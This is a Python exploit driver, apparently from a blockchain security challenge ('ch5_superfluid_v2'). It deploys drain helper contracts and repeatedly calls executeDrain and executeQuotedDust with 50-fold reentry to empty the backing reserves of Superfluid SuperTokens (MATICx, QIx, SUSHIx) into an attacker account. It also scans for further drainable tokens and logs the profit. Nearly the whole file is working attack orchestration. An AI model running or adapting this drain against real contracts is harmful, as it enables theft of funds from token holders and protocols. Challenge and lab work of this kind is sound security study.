#!/usr/bin/env python3
import importlib.util
import json
import os
import pathlib
import subprocess
from datetime import datetime, timezone


ROOT = pathlib.Path("/Users/dldustn/Desktop/AssignmentC")
CH_DIR = ROOT / "challenges" / "ch5_superfluid_v2"
BASE_DRIVER = CH_DIR / "runs" / "exploit_1776545847_driver.py"
PREFLIGHT_PATH = CH_DIR / "runs" / "tune_1776692863_preflight.json"
POSTFLIGHT_PATH = CH_DIR / "runs" / "tune_1776692863_postflight.json"
LOG_PATH = CH_DIR / "runs" / "tune_1776692863.log"

RUN_ID = 1776692863
ATTEMPT = 101
INITIAL_BALANCE_WEI = 10_000_000_000_000_000_000
PREVIOUS_BEST_DELTA_WEI = 825_112_341_279_004_443_407_216
EXPECTED_QIX_DELTA_WEI = 103_651_198_810_112_237_092_480
EXPECTED_GAIN_WEI = PREVIOUS_BEST_DELTA_WEI + EXPECTED_QIX_DELTA_WEI
GAS_ESTIMATE_WEI = 80_000_000_000_000_000_000

ZERO_ADDRESS = "0x0000000000000000000000000000000000000000"

QIX = "0xe1cA10e6a10c0F72B74dF6b7339912BaBfB1f8B5"
QI = "0x580A84C73811E1839F75d86d75d88cCa0c241fF4"
QIX_INDEX_BASE = 760_000_000
QIX_DUST_INDEX_BASE = 770_000_000
QIX_BOOTSTRAP_WEI = 5_000_000_000_000_000_000_000
QIX_REENTRY_COUNT = 50
MAX_QIX_DUST_PASSES = 10

SUSHIX = "0xDaB943C03f9e84795DC7BF51DdC71DaF0033382b"
SUSHI = "0x0b3F868E0BE5597D5DB7fEB59E1CADBb0fdDa50a"
SUSHI_INDEX_BASE = 750_000_000
SUSHI_STAGE_CAP = 5_000_000_000_000_000_000
SUSHI_REENTRY_COUNT = 50
MAX_SUSHI_PASSES = 10

RICX = "0x263026E7e53DBFDce5ae55Ade22493f828922965"


def _load_base():
    spec = importlib.util.spec_from_file_location("base_driver_1776545847", BASE_DRIVER)
    if spec is None or spec.loader is None:
        raise SystemExit(f"failed to load base driver: {BASE_DRIVER}")

    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def _log(line: str = "") -> None:
    with LOG_PATH.open("a") as fh:
        fh.write(line)
        if not line.endswith("\n"):
            fh.write("\n")


def _record_cmd(proc: subprocess.CompletedProcess[str], command: str) -> None:
    _log(command)
    if proc.stdout:
        _log(proc.stdout.rstrip())
    if proc.stderr:
        _log(proc.stderr.rstrip())


def _write_preflight(pre_balance: int, chain_id: int, block_number: int, pre_nonce: int) -> dict:
    breakeven_safety = EXPECTED_GAIN_WEI / GAS_ESTIMATE_WEI
    if breakeven_safety <= 1.5:
        raise SystemExit("breakeven safety too low; refusing broadcast")

    preflight = {
        "challenge": "ch5_superfluid_v2",
        "attempt": ATTEMPT,
        "run_id": RUN_ID,
        "pre_balance_wei": str(pre_balance),
        "expected_gain_wei": str(EXPECTED_GAIN_WEI),
        "gas_estimate_wei": str(GAS_ESTIMATE_WEI),
        "breakeven_safety": breakeven_safety,
        "chain_id": chain_id,
        "block_number": block_number,
        "pre_nonce": pre_nonce,
        "timestamp": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
        "basis": (
            "Fresh reset-head replay of the highest verified FakeHost manual stage table, "
            "plus the separately verified QIx drain and a post-replay scan of additional live SuperTokens."
        ),
        "expected_main_replay_delta_wei": str(PREVIOUS_BEST_DELTA_WEI),
        "expected_qix_delta_wei": str(EXPECTED_QIX_DELTA_WEI),
        "additional_live_tokens_checked": ["RICx"],
        "notes": (
            "Proceeding only because breakeven safety remains far above 1.5. "
            "The extra registered-token scan on the current fork still surfaces only RICx beyond the enumerated main set, "
            "and RICx exposes no underlying token for downgrade or QuickSwap conversion."
        ),
    }
    PREFLIGHT_PATH.write_text(json.dumps(preflight, indent=2) + "\n")
    return preflight


def _deploy_erc20_helper(base, rpc: str, private_key: str, super_token: str, index_base: int, intermediate: str) -> dict:
    return base.deploy_contract(
        rpc,
        private_key,
        base.CH5_ERC20_DRAIN_ARTIFACT,
        "constructor(address,address,uint32,address)",
        [super_token, base.ROUTER, str(index_base), intermediate],
        4_000_000,
    )


def _run_qix_stage(base, rpc: str, private_key: str, public_address: str, tx_hashes: list[str], qix_helpers: list[str]) -> int:
    before_native = base.balance(rpc, public_address)
    before_backing = base.token_balance(rpc, QI, QIX)
    _log("QIx stage")
    _log(f"QIx backing before: {before_backing}")
    _log(f"QIx bootstrap native: {QIX_BOOTSTRAP_WEI}")

    if before_backing <= 1:
        _log("QIx backing already empty; skipping QIx stage")
        return 0

    create_receipt = _deploy_erc20_helper(base, rpc, private_key, QIX, QIX_INDEX_BASE, ZERO_ADDRESS)
    helper = create_receipt["contractAddress"]
    qix_helpers.append(helper)
    tx_hashes.append(create_receipt["transactionHash"])
    _log(f"QIx helper: {helper}")

    simulate = base.run(
        [
            "cast",
            "call",
            "--rpc-url",
            rpc,
            "--from",
            public_address,
            "--value",
            str(QIX_BOOTSTRAP_WEI),
            helper,
            "executeDrain(uint256,uint256)",
            "1",
            str(QIX_REENTRY_COUNT),
        ]
    )
    _record_cmd(
        simulate,
        "$ cast call HELPER executeDrain(1,50) --value 5000000000000000000000 --from $PUBLIC_ADDRESS --rpc-url $RPC_CH5_SUPERFLUID_V2",
    )
    if simulate.returncode != 0:
        raise SystemExit("QIx stage simulation reverted")

    call_receipt = base.send_or_die(
        [
            "cast",
            "send",
            "--gas-limit",
            "15000000",
            "--rpc-url",
            rpc,
            "--private-key",
            private_key,
            "--json",
            helper,
            "executeDrain(uint256,uint256)",
            "1",
            str(QIX_REENTRY_COUNT),
            "--value",
            str(QIX_BOOTSTRAP_WEI),
        ],
        "QIx stage",
    )
    tx_hashes.append(call_receipt["transactionHash"])

    after_native = base.balance(rpc, public_address)
    after_backing = base.token_balance(rpc, QI, QIX)
    delta = after_native - before_native
    _log(f"QIx native delta: {delta}")
    _log(f"QIx backing final: {after_backing}")

    for pass_index in range(1, MAX_QIX_DUST_PASSES + 1):
        before_pass_native = base.balance(rpc, public_address)
        before_pass_backing = base.token_balance(rpc, QI, QIX)
        _log(f"QIx dust pass {pass_index}")
        _log(f"QIx dust backing before: {before_pass_backing}")

        if before_pass_backing <= 1:
            _log("QIx backing exhausted; stopping dust stage")
            break

        create_receipt = _deploy_erc20_helper(base, rpc, private_key, QIX, QIX_DUST_INDEX_BASE, ZERO_ADDRESS)
        helper = create_receipt["contractAddress"]
        qix_helpers.append(helper)
        tx_hashes.append(create_receipt["transactionHash"])
        _log(f"QIx dust helper: {helper}")

        simulate = base.run(
            [
                "cast",
                "call",
                "--rpc-url",
                rpc,
                "--from",
                public_address,
                "--value",
                str(QIX_BOOTSTRAP_WEI),
                helper,
                "executeQuotedDust(uint256)",
                str(QIX_REENTRY_COUNT),
            ]
        )
        _record_cmd(
            simulate,
            "$ cast call HELPER executeQuotedDust(50) --value 5000000000000000000000 --from $PUBLIC_ADDRESS --rpc-url $RPC_CH5_SUPERFLUID_V2",
        )
        if simulate.returncode != 0:
            _log("QIx dust simulation reverted; stopping dust stage")
            break

        call_receipt = base.send_or_die(
            [
                "cast",
                "send",
                "--gas-limit",
                "15000000",
                "--rpc-url",
                rpc,
                "--private-key",
                private_key,
                "--json",
                helper,
                "executeQuotedDust(uint256)",
                str(QIX_REENTRY_COUNT),
                "--value",
                str(QIX_BOOTSTRAP_WEI),
            ],
            f"QIx dust pass {pass_index}",
        )
        tx_hashes.append(call_receipt["transactionHash"])

        after_pass_native = base.balance(rpc, public_address)
        after_pass_backing = base.token_balance(rpc, QI, QIX)
        pass_delta = after_pass_native - before_pass_native
        delta += pass_delta
        _log(f"QIx dust native delta: {pass_delta}")
        _log(f"QIx dust backing final: {after_pass_backing}")

        if after_pass_backing == 0:
            _log("QIx backing reached zero; stopping dust stage")
            break

    return delta


def _run_sushi_stage(base, rpc: str, private_key: str, public_address: str, tx_hashes: list[str], helpers: list[str]) -> int:
    _log("supplemental SUSHIx stage")
    total_delta = 0

    for pass_index in range(1, MAX_SUSHI_PASSES + 1):
        before_native = base.balance(rpc, public_address)
        before_backing = base.token_balance(rpc, SUSHI, SUSHIX)
        _log(f"SUSHIx pass {pass_index}")
        _log(f"SUSHIx backing before: {before_backing}")

        if before_backing <= 1:
            _log("SUSHIx backing exhausted; stopping supplemental stage")
            break

        create_receipt = _deploy_erc20_helper(base, rpc, private_key, SUSHIX, SUSHI_INDEX_BASE, ZERO_ADDRESS)
        helper = create_receipt["contractAddress"]
        helpers.append(helper)
        tx_hashes.append(create_receipt["transactionHash"])
        _log(f"SUSHIx helper: {helper}")

        simulate = base.run(
            [
                "cast",
                "call",
                "--rpc-url",
                rpc,
                "--from",
                public_address,
                "--value",
                str(SUSHI_STAGE_CAP),
                helper,
                "executeQuotedDust(uint256)",
                str(SUSHI_REENTRY_COUNT),
            ]
        )
        _record_cmd(
            simulate,
            "$ cast call HELPER executeQuotedDust(50) --value 5000000000000000000 --from $PUBLIC_ADDRESS --rpc-url $RPC_CH5_SUPERFLUID_V2",
        )
        if simulate.returncode != 0:
            _log("SUSHIx simulation reverted; stopping supplemental stage")
            break

        call_receipt = base.send_or_die(
            [
                "cast",
                "send",
                "--gas-limit",
                "15000000",
                "--rpc-url",
                rpc,
                "--private-key",
                private_key,
                "--json",
                helper,
                "executeQuotedDust(uint256)",
                str(SUSHI_REENTRY_COUNT),
                "--value",
                str(SUSHI_STAGE_CAP),
            ],
            f"SUSHIx pass {pass_index}",
        )
        tx_hashes.append(call_receipt["transactionHash"])

        after_native = base.balance(rpc, public_address)
        after_backing = base.token_balance(rpc, SUSHI, SUSHIX)
        pass_delta = after_native - before_native
        total_delta += pass_delta
        _log(f"SUSHIx native delta: {pass_delta}")
        _log(f"SUSHIx backing final: {after_backing}")

        if after_backing == 0:
            _log("SUSHIx backing reached zero; stopping supplemental stage")
            break

    return total_delta


def _log_additional_token_scan(base, rpc: str) -> dict:
    _log("additional registered token scan")
    underlying_proc = base.run(
        ["cast", "call", RICX, "getUnderlyingToken()(address)", "--rpc-url", rpc]
    )
    _record_cmd(
        underlying_proc,
        f"$ cast call {RICX} 'getUnderlyingToken()(address)' --rpc-url $RPC_CH5_SUPERFLUID_V2",
    )

    if underlying_proc.returncode != 0:
        return {"token": "RICx", "status": "rpc_error", "detail": underlying_proc.stderr.strip()}

    underlying = underlying_proc.stdout.strip()
    result = {"token": "RICx", "underlying": underlying}

    if underlying.lower() == ZERO_ADDRESS.lower():
        _log("RICx skip: SuperToken exposes no underlying token")
        result["status"] = "skipped_no_underlying"
        return result

    backing = base.token_balance(rpc, underlying, RICX)
    _log(f"RICx backing: {backing}")
    result["status"] = "backing_only"
    result["backing_wei"] = str(backing)
    return result


def main() -> int:
    base = _load_base()
    base.LOG_PATH = LOG_PATH

    rpc = os.environ["RPC_CH5_SUPERFLUID_V2"]
    private_key = os.environ["PRIVATE_KEY"]
    public_address = os.environ["PUBLIC_ADDRESS"]

    LOG_PATH.write_text("")

    chain_id = base.call_uint(["cast", "chain-id", "--rpc-url", rpc])
    block_number = base.call_uint(["cast", "block-number", "--rpc-url", rpc])
    pre_nonce = base.nonce(rpc, public_address)
    pre_balance = base.balance(rpc, public_address)
    preflight = _write_preflight(pre_balance, chain_id, block_number, pre_nonce)

    _log(f"=== tune_{RUN_ID} {datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')} ===")
    _log(
        "manual reset-head broadcast from the highest verified FakeHost replay, "
        "plus QIx and all currently-known residual token families"
    )
    _log(json.dumps(preflight, indent=2))
    _log(f"$ cast chain-id --rpc-url $RPC_CH5_SUPERFLUID_V2\n{chain_id}")
    _log(f"$ cast block-number --rpc-url $RPC_CH5_SUPERFLUID_V2\n{block_number}")
    _log(f"$ cast nonce $PUBLIC_ADDRESS --rpc-url $RPC_CH5_SUPERFLUID_V2\n{pre_nonce}")
    _log(f"$ cast balance $PUBLIC_ADDRESS --rpc-url $RPC_CH5_SUPERFLUID_V2\n{pre_balance}")
    _log(f"$ cast balance {base.MATICX} --rpc-url $RPC_CH5_SUPERFLUID_V2\n{base.balance(rpc, base.MATICX)}")

    if pre_nonce != 0:
        _log("ERROR: nonce is not 0 on reset head; refusing replay")
        return 1

    tx_hashes: list[str] = []
    sushi_helpers: list[str] = []
    qix_helpers: list[str] = []

    _log("native stage")
    create1 = base.deploy_contract(rpc, private_key, base.CH5_DRAIN_ARTIFACT, None, [], 3_500_000)
    helper1 = create1["contractAddress"]
    tx_hashes.append(create1["transactionHash"])
    _log(f"native helper 1: {helper1}")

    for idx, seed in enumerate(base.NATIVE_SEEDS, 1):
        _log(f"native round {idx} seed: {seed}")
        receipt = base.send_or_die(
            [
                "cast",
                "send",
                "--gas-limit",
                "5500000",
                "--rpc-url",
                rpc,
                "--private-key",
                private_key,
                "--json",
                helper1,
                "executeRound(uint256)",
                str(base.NATIVE_REENTRY_COUNT),
                "--value",
                str(seed),
            ],
            f"native round {idx}",
        )
        tx_hashes.append(receipt["transactionHash"])

    create2 = base.deploy_contract(rpc, private_key, base.CH5_DRAIN_ARTIFACT, None, [], 3_500_000)
    helper2 = create2["contractAddress"]
    tx_hashes.append(create2["transactionHash"])
    _log(f"native helper 2: {helper2}")
    _log(f"native phase2 seed: {base.NATIVE_PHASE2_SEED}")
    receipt = base.send_or_die(
        [
            "cast",
            "send",
            "--gas-limit",
            "5500000",
            "--rpc-url",
            rpc,
            "--private-key",
            private_key,
            "--json",
            helper2,
            "executeRound(uint256)",
            str(base.NATIVE_REENTRY_COUNT),
            "--value",
            str(base.NATIVE_PHASE2_SEED),
        ],
        "native phase2",
    )
    tx_hashes.append(receipt["transactionHash"])

    native_after_main = base.balance(rpc, public_address)
    native_backing_after = base.balance(rpc, base.MATICX)
    _log(f"ATTACKER_NATIVE_AFTER_MATICX: {native_after_main}")
    _log(f"MATICX_NATIVE_BACKING_AFTER: {native_backing_after}")

    for stage in base.ERC20_STAGES:
        before_native = base.balance(rpc, public_address)
        before_backing = base.token_balance(rpc, stage["underlying"], stage["super_token"])
        _log(stage["label"])
        _log(f"underlying backing before: {before_backing}")
        _log(f"bootstrap native: {stage['bootstrap']}")

        create_receipt = _deploy_erc20_helper(
            base,
            rpc,
            private_key,
            stage["super_token"],
            stage["index_base"],
            ZERO_ADDRESS,
        )
        helper = create_receipt["contractAddress"]
        tx_hashes.append(create_receipt["transactionHash"])
        _log(f"drain helper: {helper}")

        call_receipt = base.send_or_die(
            [
                "cast",
                "send",
                "--gas-limit",
                "15000000",
                "--rpc-url",
                rpc,
                "--private-key",
                private_key,
                "--json",
                helper,
                "executeDrain(uint256,uint256)",
                "1",
                "50",
                "--value",
                str(stage["bootstrap"]),
            ],
            stage["label"],
        )
        tx_hashes.append(call_receipt["transactionHash"])

        after_native = base.balance(rpc, public_address)
        after_backing = base.token_balance(rpc, stage["underlying"], stage["super_token"])
        _log(f"token native delta: {after_native - before_native}")
        _log(f"underlying backing final: {after_backing}")

    post_main_balance = base.balance(rpc, public_address)
    _log(f"ATTACKER_NATIVE_AFTER_MAIN_REPLAY: {post_main_balance}")

    qix_delta = _run_qix_stage(base, rpc, private_key, public_address, tx_hashes, qix_helpers)
    sushix_delta = _run_sushi_stage(base, rpc, private_key, public_address, tx_hashes, sushi_helpers)
    ric_scan = _log_additional_token_scan(base, rpc)

    post_balance = base.balance(rpc, public_address)
    post_nonce = base.nonce(rpc, public_address)
    actual_delta = post_balance - pre_balance
    supplemental_delta = post_balance - post_main_balance
    qix_backing_after = base.token_balance(rpc, QI, QIX)
    sushix_backing_after = base.token_balance(rpc, SUSHI, SUSHIX)

    _log(f"$ cast nonce $PUBLIC_ADDRESS --rpc-url $RPC_CH5_SUPERFLUID_V2\n{post_nonce}")
    _log(f"$ cast balance $PUBLIC_ADDRESS --rpc-url $RPC_CH5_SUPERFLUID_V2\n{post_balance}")
    _log(f"$ cast call {QI} 'balanceOf(address)(uint256)' {QIX} --rpc-url $RPC_CH5_SUPERFLUID_V2\n{qix_backing_after}")
    _log(f"$ cast call {SUSHI} 'balanceOf(address)(uint256)' {SUSHIX} --rpc-url $RPC_CH5_SUPERFLUID_V2\n{sushix_backing_after}")

    improved = actual_delta > PREVIOUS_BEST_DELTA_WEI
    postflight = {
        "challenge": "ch5_superfluid_v2",
        "attempt": ATTEMPT,
        "run_id": RUN_ID,
        "successful": improved,
        "pre_balance_wei": str(pre_balance),
        "post_balance_wei": str(post_balance),
        "delta_wei": str(actual_delta),
        "actual_delta_wei": str(actual_delta),
        "previous_best_delta_wei": str(PREVIOUS_BEST_DELTA_WEI),
        "improved_vs_previous_best": improved,
        "initial_balance_wei": str(INITIAL_BALANCE_WEI),
        "total_delta_vs_initial_wei": str(post_balance - INITIAL_BALANCE_WEI),
        "main_replay_post_balance_wei": str(post_main_balance),
        "supplemental_delta_wei": str(supplemental_delta),
        "qix_delta_wei": str(qix_delta),
        "sushix_delta_wei": str(sushix_delta),
        "qix_backing_after_wei": str(qix_backing_after),
        "sushix_backing_after_wei": str(sushix_backing_after),
        "ric_scan": ric_scan,
        "pre_nonce": pre_nonce,
        "post_nonce": post_nonce,
        "tx_hash": tx_hashes[-1] if tx_hashes else "",
        "tx_hashes": tx_hashes,
        "qix_helpers": qix_helpers,
        "supplemental_helpers": sushi_helpers,
        "timestamp": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
        "notes": (
            "Reset-head manual replay reused the highest verified FakeHost stage table, then added the separately "
            "verified QIx drain and quoted-dust continuation before re-running the SUSHIx dust cleanup. "
            "The only extra live pending token beyond the enumerated main set remains RICx, which still exposes no underlying token."
        ),
    }
    POSTFLIGHT_PATH.write_text(json.dumps(postflight, indent=2) + "\n")

    print(json.dumps(postflight, indent=2))
    return 0 if improved else 1


if __name__ == "__main__":
    raise SystemExit(main())
